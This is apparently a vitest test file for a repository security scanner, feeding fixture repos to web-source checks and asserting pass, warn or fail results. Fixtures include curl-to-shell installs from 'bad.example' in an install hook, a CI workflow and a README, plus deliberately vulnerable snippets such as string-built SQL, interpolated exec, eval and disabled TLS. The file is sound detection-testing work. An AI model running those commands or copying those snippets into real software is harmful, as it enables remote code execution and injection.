import { describe, it, expect } from "vitest";
import { evaluateWebSourceChecks } from "../web-repo-source";
import type { RepoSnapshot } from "../native-mobile";

// ─────────────────────────────────────────────────────────────────────────────
// This family carries the highest false-positive risk in Pulse, because unlike
// the platform families it matches PATTERNS in ordinary application code rather
// than reading a named config value. So most of these tests are about staying
// QUIET: on template code, on placeholders, on localhost, on comments.
//
// A scanner that fires on every React app is one people learn to scroll past,
// and at that point it is worse than no scanner — it costs attention and buys
// nothing.
// ─────────────────────────────────────────────────────────────────────────────

function snapshot(files: Record<string, string>, extraPaths: string[] = []): RepoSnapshot {
  return {
    owner: "acme",
    repo: "app",
    paths: [...Object.keys(files), ...extraPaths],
    files: new Map(Object.entries(files)),
    truncated: false,
    accessible: true,
  };
}

const statusOf = (checks: { checkKey: string; status: string }[], key: string) =>
  checks.find((c) => c.checkKey === key)?.status;
const keys = (checks: { checkKey: string }[]) => checks.map((c) => c.checkKey);

describe("gating", () => {
  it("returns nothing for an unreadable repo", () => {
    const snap = { ...snapshot({}), accessible: false };
    expect(evaluateWebSourceChecks(snap)).toEqual([]);
  });

  it("returns nothing when no source was actually read", () => {
    // A wall of passes over files we never fetched is the §35 failure exactly.
    expect(evaluateWebSourceChecks(snapshot({}))).toEqual([]);
  });
});

describe("Pulse audit controls", () => {
  it("finds executable policy, coverage, and enforcement evidence", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      ".github/workflows/quality.yml": `
        - run: pulse static-analysis --config audit-policy.yml --severity high --block
        - run: pulse secret-scan --history --remediate rotate
        - run: pulse supply-chain --sbom --severity critical --block
        - run: pulse code-flow --sources untrusted-input --sinks database,shell,html
        - run: pulse browser-test --trace --screenshot --critical login,checkout
        - run: pulse accessibility-test --keyboard-navigation --accessible-name --contrast-check
        - run: pulse dynamic-security --authenticated --staging
      `,
      "audit-policy.yml": `static-analysis:\n  rules: strict`,
    }));
    for (const key of [
      "pulse_static_analysis_gate", "pulse_static_analysis_policy", "pulse_static_analysis_blocking",
      "pulse_secret_scan_gate", "pulse_secret_history_scope", "pulse_secret_remediation",
      "pulse_supply_chain_gate", "pulse_supply_chain_inventory", "pulse_supply_chain_blocking",
      "pulse_code_flow_gate", "pulse_code_flow_sources", "pulse_code_flow_sinks",
      "pulse_browser_journeys", "pulse_browser_failure_evidence", "pulse_browser_release_coverage",
      "pulse_accessibility_assertions", "pulse_accessibility_keyboard", "pulse_accessibility_semantics",
      "pulse_dynamic_security_gate", "pulse_dynamic_security_auth", "pulse_dynamic_security_isolation",
    ]) {
      expect(statusOf(checks, key), key).toBe("PASS");
    }
  });

  it("does not invent audit evidence from ordinary app code", () => {
    const checks = evaluateWebSourceChecks(snapshot({ "src/app.ts": `export const title = "hello";` }));
    expect(statusOf(checks, "pulse_static_analysis_gate")).toBe("WARN");
    expect(statusOf(checks, "pulse_dynamic_security_gate")).toBe("WARN");
  });
});

describe("delivery and abuse safeguards", () => {
  it("finds unsafe CI privileges, mutable inputs, remote shell bootstrap, and risky install hooks", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "package.json": JSON.stringify({ scripts: { postinstall: "curl https://bad.example/install | sh" } }),
      ".github/workflows/review.yml": `on: pull_request_target\npermissions: write-all\nsteps:\n - uses: acme/action@v2\n - image: acme/build:latest\n - run: curl https://bad.example/install | sh`,
    }));
    for (const key of ["pulse_ci_untrusted_privilege", "pulse_ci_remote_shell", "pulse_install_lifecycle_risk"]) expect(statusOf(checks, key)).toBe("FAIL");
    for (const key of ["pulse_ci_immutable_actions", "pulse_ci_immutable_images"]) expect(statusOf(checks, key)).toBe("WARN");
  });

  it("tests URL secrets and server input limits", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "src/server.ts": `const app = express(); app.use(express.json({ limit: "1mb" })); app.post("/upload", upload.single("file")); const x = "https://api.example/x?api_key=secret"; const limits = { fileSize: 1000 };`,
    }));
    expect(statusOf(checks, "pulse_url_secret")).toBe("FAIL");
    expect(statusOf(checks, "pulse_request_body_limit")).toBe("PASS");
    expect(statusOf(checks, "pulse_upload_limit")).toBe("PASS");
  });

  it("finds unsafe checkout, container, redirect, SSRF, storage, webhook, and AI tool patterns", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "Dockerfile": `FROM node:22\nARG API_TOKEN=value`,
      ".github/workflows/review.yml": `on: pull_request_target\nsteps:\n - uses: actions/checkout@v4\n   with:\n    ref: \${{ github.event.pull_request.head.sha }}`,
      "src/app.ts": `bucket({ public: true }); redirect(req.query.next); fetch(req.body.url); webhook(event); toolCall({});`,
    }));
    for (const key of ["pulse_ci_untrusted_checkout", "pulse_container_secret_layer", "pulse_public_storage_policy", "pulse_open_redirect", "pulse_ssrf"]) expect(statusOf(checks, key)).toBe("FAIL");
    expect(statusOf(checks, "pulse_container_nonroot")).toBe("WARN");
    expect(statusOf(checks, "pulse_webhook_replay")).toBe("WARN");
    expect(statusOf(checks, "pulse_ai_tool_controls")).toBe("WARN");
  });
});

describe("AI repository safety", () => {
  it("detects concrete unsafe AI implementation paths", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "src/ai.ts": `const client = openai; const key = "sk-abcdefghijklmnopqrstuvwxyz123456"; const system = "${"x".repeat(90)}"; toolCall(() => exec(command)); vectorStore.similaritySearch(query);`,
    }));
    for (const key of ["pulse_ai_client_secret", "pulse_ai_client_prompt", "pulse_ai_unsafe_tool", "pulse_ai_unscoped_retrieval"]) expect(statusOf(checks, key)).toBe("FAIL");
    for (const key of ["pulse_ai_tool_confirmation", "pulse_ai_output_schema", "pulse_ai_budget_timeout", "pulse_ai_audit_log"]) expect(statusOf(checks, key)).toBe("WARN");
  });
});

describe("AI repository readiness", () => {
  it("verifies operational AI evidence from source", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "src/ai.ts": `const client = openai; const model = "x"; const modelVersion = "v1"; const maxTokens = 100; const retry = 2; const fallback = "try again"; const controller = new AbortController(); trace("ai"); feedback("up"); const evals = testCases;`,
    }));
    for (const key of ["pulse_ai_retry_policy", "pulse_ai_failure_fallback", "pulse_ai_stream_cancel", "pulse_ai_evaluation_fixture", "pulse_ai_monitoring", "pulse_ai_cost_budget", "pulse_ai_feedback_capture", "pulse_ai_model_version"]) expect(statusOf(checks, key)).toBe("PASS");
  });
});

describe("injection — presence findings", () => {
  it("fails raw HTML rendering with no sanitiser present", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "src/Post.tsx": `<div dangerouslySetInnerHTML={{ __html: post.body }} />`,
    }));
    expect(statusOf(checks, "web_raw_html_injection")).toBe("FAIL");
  });

  it("downgrades to WARN when a sanitiser is in the project", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "package.json": JSON.stringify({ dependencies: { dompurify: "^3.0.0" } }),
      "src/Post.tsx": `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.body) }} />`,
    }));
    expect(statusOf(checks, "web_raw_html_injection")).toBe("WARN");
  });

  it("says nothing at all when there is no raw HTML rendering", () => {
    const checks = evaluateWebSourceChecks(snapshot({ "src/Post.tsx": `<div>{post.body}</div>` }));
    expect(keys(checks)).not.toContain("web_raw_html_injection");
  });

  it("detects SQL built by each of the four idioms", () => {
    const cases: Array<[string, string]> = [
      ["python-fstring", `cur.execute(f"SELECT * FROM users WHERE id = {uid}")`],
      ["str-format", `cur.execute("SELECT * FROM users WHERE id = {}".format(uid))`],
      ["template-literal", "db.query(`SELECT * FROM users WHERE id = ${uid}`)"],
      ["concat", `db.query("SELECT * FROM users WHERE id = " + uid)`],
    ];
    for (const [name, code] of cases) {
      const checks = evaluateWebSourceChecks(snapshot({ "src/db.js": code }));
      expect(statusOf(checks, "web_sql_string_building"), name).toBe("FAIL");
    }
  });

  it("stays quiet on parameterised SQL", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "src/db.js": `db.query("SELECT * FROM users WHERE id = $1", [uid])`,
      "src/py.py": `cur.execute("SELECT * FROM users WHERE id = %s", (uid,))`,
    }));
    expect(keys(checks)).not.toContain("web_sql_string_building");
  });

  it("does not read a commented-out eval as live code", () => {
    // Third time this class of bug is guarded in this codebase (§34.3, §34.6).
    const checks = evaluateWebSourceChecks(snapshot({
      "src/run.js": `// eval(userInput)  <- removed in review\nconst x = JSON.parse(input);`,
    }));
    expect(keys(checks)).not.toContain("web_dynamic_code_execution");
  });

  it("does not truncate a URL when stripping comments", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "src/run.js": `const api = "https://api.example.com/v1"; eval(userInput);`,
    }));
    expect(statusOf(checks, "web_dynamic_code_execution")).toBe("FAIL");
  });

  it("flags shell execution built from a variable but not a fixed command", () => {
    const interpolated = evaluateWebSourceChecks(snapshot({
      "src/git.js": "exec(`git clone ${repoUrl}`)",
    }));
    expect(statusOf(interpolated, "web_shell_injection")).toBe("FAIL");

    const fixed = evaluateWebSourceChecks(snapshot({
      "src/git.js": `execFile("git", ["clone", repoUrl])`,
    }));
    expect(keys(fixed)).not.toContain("web_shell_injection");
  });

  it("flags yaml.load without SafeLoader but not with it", () => {
    const unsafe = evaluateWebSourceChecks(snapshot({ "src/cfg.py": `cfg = yaml.load(f)` }));
    expect(statusOf(unsafe, "web_unsafe_deserialization")).toBe("FAIL");

    const safe = evaluateWebSourceChecks(snapshot({ "src/cfg.py": `cfg = yaml.load(f, Loader=yaml.SafeLoader)` }));
    expect(keys(safe)).not.toContain("web_unsafe_deserialization");
  });
});

describe("credentials", () => {
  it("warns when .gitignore exists but misses .env", () => {
    // The case a presence test passes — and the second most common finding in
    // AI-built repos. Pulse could previously only see "a .gitignore is present".
    const checks = evaluateWebSourceChecks(snapshot({
      ".gitignore": `node_modules/\ndist/\n.DS_Store`,
      "src/app.js": `const x = 1;`,
    }));
    expect(statusOf(checks, "web_gitignore_covers_env")).toBe("WARN");
  });

  it("passes when .gitignore covers .env", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      ".gitignore": `node_modules/\n.env\n.env.*`,
      "src/app.js": `const x = 1;`,
    }));
    expect(statusOf(checks, "web_gitignore_covers_env")).toBe("PASS");
  });

  it("fails outright when a .env is actually committed", () => {
    const checks = evaluateWebSourceChecks(snapshot(
      { ".gitignore": `node_modules/`, "src/app.js": `const x = 1;` },
      [".env"],
    ));
    expect(statusOf(checks, "web_gitignore_covers_env")).toBe("FAIL");
  });

  it("does not count .env.example as a committed secret", () => {
    const checks = evaluateWebSourceChecks(snapshot(
      { ".gitignore": `.env`, "src/app.js": `const x = 1;` },
      [".env.example"],
    ));
    expect(statusOf(checks, "web_gitignore_covers_env")).toBe("PASS");
  });

  it("downgrades a password finding when it looks like a placeholder", () => {
    const placeholder = evaluateWebSourceChecks(snapshot({
      "src/config.js": `const password = "changeme";`,
    }));
    expect(statusOf(placeholder, "web_hardcoded_password")).toBe("WARN");

    const real = evaluateWebSourceChecks(snapshot({
      "src/config.js": `const password = "Tr0ub4dor&3xkcd";`,
    }));
    expect(statusOf(real, "web_hardcoded_password")).toBe("FAIL");
  });
});

describe("Supabase RLS from the repo side", () => {
  it("fails when Supabase is used and no migration enables RLS", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "package.json": JSON.stringify({ dependencies: { "@supabase/supabase-js": "^2.0.0" } }),
      "src/db.ts": `import { createClient } from "@supabase/supabase-js"`,
      "supabase/migrations/001_init.sql": `CREATE TABLE profiles (id uuid, user_id uuid);`,
    }));
    expect(statusOf(checks, "web_supabase_rls_migrations")).toBe("FAIL");
  });

  it("warns on a USING (true) policy — security theatre", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "package.json": JSON.stringify({ dependencies: { "@supabase/supabase-js": "^2.0.0" } }),
      "src/db.ts": `createClient(url, anonKey)`,
      "supabase/migrations/001_init.sql":
        `ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;\nCREATE POLICY p ON profiles USING (true);`,
    }));
    expect(statusOf(checks, "web_supabase_rls_migrations")).toBe("WARN");
  });

  it("passes a scoped policy", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "package.json": JSON.stringify({ dependencies: { "@supabase/supabase-js": "^2.0.0" } }),
      "src/db.ts": `createClient(url, anonKey)`,
      "supabase/migrations/001_init.sql":
        `ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;\nCREATE POLICY p ON profiles USING (auth.uid() = user_id);`,
    }));
    expect(statusOf(checks, "web_supabase_rls_migrations")).toBe("PASS");
  });

  it("says nothing for a project that does not use Supabase", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "src/db.ts": `import pg from "pg"`,
      "migrations/001.sql": `CREATE TABLE users (id serial);`,
    }));
    expect(keys(checks)).not.toContain("web_supabase_rls_migrations");
  });
});

describe("framework defaults and transport", () => {
  it("fails committed debug mode", () => {
    const checks = evaluateWebSourceChecks(snapshot({ "settings.py": `DEBUG = True` }));
    expect(statusOf(checks, "web_debug_mode_enabled")).toBe("FAIL");
  });

  it("fails disabled TLS verification", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "src/client.js": `const agent = new https.Agent({ rejectUnauthorized: false })`,
    }));
    expect(statusOf(checks, "web_tls_verification_disabled")).toBe("FAIL");
  });

  it("excludes localhost from the plaintext-URL finding", () => {
    const local = evaluateWebSourceChecks(snapshot({
      "src/dev.js": `const api = "http://localhost:3000/api";`,
    }));
    expect(keys(local)).not.toContain("web_plaintext_api_calls");

    const remote = evaluateWebSourceChecks(snapshot({
      "src/dev.js": `const api = "http://api.partner.com/v1";`,
    }));
    expect(statusOf(remote, "web_plaintext_api_calls")).toBe("WARN");
  });

  it("fails wildcard CORS with credentials, warns without", () => {
    const withCreds = evaluateWebSourceChecks(snapshot({
      "src/server.js": `app.use(cors({ origin: "*", credentials: true }))`,
    }));
    expect(statusOf(withCreds, "web_cors_source_config")).toBe("FAIL");

    const without = evaluateWebSourceChecks(snapshot({
      "src/server.js": `app.use(cors({ origin: "*" }))`,
    }));
    expect(statusOf(without, "web_cors_source_config")).toBe("WARN");
  });

  it("only asks about helmet for a node http framework", () => {
    const express = evaluateWebSourceChecks(snapshot({
      "package.json": JSON.stringify({ dependencies: { express: "^4.18.0" } }),
      "src/server.js": `const app = express();`,
    }));
    expect(statusOf(express, "web_security_headers_middleware")).toBe("WARN");

    const frontend = evaluateWebSourceChecks(snapshot({
      "package.json": JSON.stringify({ dependencies: { react: "^19.0.0" } }),
      "src/App.tsx": `export default function App() { return null; }`,
    }));
    expect(keys(frontend)).not.toContain("web_security_headers_middleware");
  });
});

describe("supply chain", () => {
  it("warns on curl piped into a shell in the README", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "README.md": "## Install\n\n```\ncurl -fsSL https://example.com/i.sh | sh\n```",
      "src/app.js": `const x = 1;`,
    }));
    expect(statusOf(checks, "web_curl_pipe_shell")).toBe("WARN");
  });

  it("warns on unpinned dependency specifiers", () => {
    const checks = evaluateWebSourceChecks(snapshot({
      "package.json": JSON.stringify({ dependencies: { lodash: "*", react: "latest" } }),
      "src/app.js": `const x = 1;`,
    }));
    expect(statusOf(checks, "web_dependency_pinning")).toBe("WARN");
  });

  it("passes pinned dependencies with a lockfile", () => {
    const checks = evaluateWebSourceChecks(snapshot(
      {
        "package.json": JSON.stringify({ dependencies: { lodash: "^4.17.21" } }),
        "src/app.js": `const x = 1;`,
      },
      ["package-lock.json"],
    ));
    expect(statusOf(checks, "web_dependency_pinning")).toBe("PASS");
  });
});

describe("a clean repo produces a clean report, not a wall of findings", () => {
  it("emits no FAILs for a well-built project", () => {
    const checks = evaluateWebSourceChecks(snapshot(
      {
        "package.json": JSON.stringify({ dependencies: { express: "^4.18.0", helmet: "^7.0.0" } }),
        ".gitignore": `node_modules/\n.env\n.env.*`,
        "README.md": "## Install\n\n```\nnpm install\n```",
        "src/server.js":
          `const app = express();\napp.use(helmet());\n` +
          `app.use(cors({ origin: ["https://app.example.com"], credentials: true }));\n` +
          `db.query("SELECT * FROM users WHERE id = $1", [id]);`,
      },
      ["package-lock.json"],
    ));
    expect(checks.filter((c) => c.status === "FAIL")).toEqual([]);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// SQL string building — found wrong by running this family against a REAL
// TypeScript repository rather than a fixture (§34.3's standing lesson).
//
// As first written it reported three Prisma-only API routes as SQL injection,
// at FAIL, in Security. Under the release gate that is a BLOCKED launch on a
// false positive — the worst outcome the gate can produce. Five compounding
// causes, each of which alone makes the rule unusable on real code, and each
// with a test below:
//
//   1. `[^"']*` had no bound, so the "string literal" ran for hundreds of lines.
//   2. `f["']` matched the closing quote of `"STAFF"`.
//   3. A lone `WHERE` matched Prisma's `where:`.
//   4. `[^"']` could not cross the apostrophe in `= '" + email`, dropping the
//      commonest real injection shape.
//   5. Fixing (4) alone let English prose through.
// ─────────────────────────────────────────────────────────────────────────────

const sqlFires = (file: string, body: string) =>
  keys(evaluateWebSourceChecks(snapshot({ [file]: body }))).includes("web_sql_string_building");

describe("web_sql_string_building catches real string-built SQL", () => {
  const cases: Array<[string, string, string]> = [
    ["a Python f-string", "app.py", 'cur.execute(f"SELECT * FROM users WHERE id = {user_id}")'],
    ["an f-string INSERT", "app.py", 'cur.execute(f"INSERT INTO logs VALUES ({v})")'],
    ["a template literal", "db.ts", "await sql(`SELECT id, email FROM users WHERE org = ${orgId}`);"],
    ["a template DELETE", "db.ts", "await client.query(`DELETE FROM sessions WHERE id = ${id}`);"],
    ["an UPDATE ... SET", "db.ts", "await sql(`UPDATE users SET name = ${name} WHERE id = ${id}`);"],
    // The commonest real shape there is, and the one a naive `[^"']` class drops
    // because the double-quoted string legitimately contains an apostrophe.
    ["quote-wrapped concatenation", "db.js", `const q = "SELECT * FROM users WHERE email = '" + email;`],
    ["str.format()", "app.py", 'cur.execute("SELECT * FROM t WHERE a = {}".format(a))'],
    ["%-formatting", "app.py", 'cur.execute("SELECT * FROM t WHERE a = %s" % (a,))'],
  ];
  for (const [name, file, body] of cases) {
    it(`fires on ${name}`, () => expect(sqlFires(file, body)).toBe(true));
  }
});

describe("web_sql_string_building stays quiet on ordinary web code", () => {
  const cases: Array<[string, string, string]> = [
    // The exact shape that produced the live false positive: a string ending in
    // the letter F, then unquoted code, then a Prisma `where:`.
    [
      "a Prisma query in a file containing \"STAFF\"",
      "route.ts",
      'const role = "STAFF";\nconst u = await prisma.user.findMany({\n  where: { workspace: { slug } },\n  select: { id: true },\n});',
    ],
    ["an import and an unrelated template literal", "a.ts", 'import { x } from "./x";\nconst msg = `imported from ${x}`;'],
    ["a properly parameterised query", "db.ts", 'await client.query("SELECT * FROM users WHERE id = $1", [id]);'],
    ["a <select> element", "f.tsx", "export const F = () => <select onChange={(e) => update(e)} />;"],
    ["a deleteUser helper", "a.ts", "export function deleteUser(id: string) { return api.delete(`/users/${id}`); }"],
    ["a query builder", "a.ts", 'const rows = await db.selectFrom("users").where("id", "=", id).execute();'],
    // Prose that contains SELECT…FROM and is concatenated. Distinguished by
    // where the hole lands: SQL breaks at a value position, prose does not.
    ["a UI label built by concatenation", "ui.ts", 'const label = "Select an item from the list " + name;'],
    ["a UI label built by interpolation", "ui.ts", "const label = `Select a value from the menu ${name}`;"],
    ["copy that happens to say 'delete from'", "ui.ts", 'const t = "Delete from favourites, then retry " + n;'],
  ];
  for (const [name, file, body] of cases) {
    it(`stays quiet on ${name}`, () => expect(sqlFires(file, body)).toBe(false));
  }
});

// The shell rule's body was length-bounded as PRECAUTION, not because a defect
// was demonstrated — it shares the SQL rule's dangerous shape (opens on a quote,
// terminates on `${` rather than the matching quote) but its exclusion class
// covers all three quote characters, which turns out to bound it in practice. No
// fixture reproduced a false positive, so there is no negative test here: a test
// that cannot tell the bug from the fix is not coverage, it is decoration. These
// two assert the rule still catches what it is for after the bound.
describe("web_shell_injection still catches interpolated commands", () => {
  const shellFires = (file: string, body: string) =>
    keys(evaluateWebSourceChecks(snapshot({ [file]: body }))).includes("web_shell_injection");

  it("fires on a shell command built by interpolation", () => {
    expect(shellFires("run.ts", "exec(`git clone ${repoUrl}`);")).toBe(true);
  });

  it("fires on Python shell=True", () => {
    expect(shellFires("run.py", "subprocess.run(cmd, shell=True)")).toBe(true);
  });
});
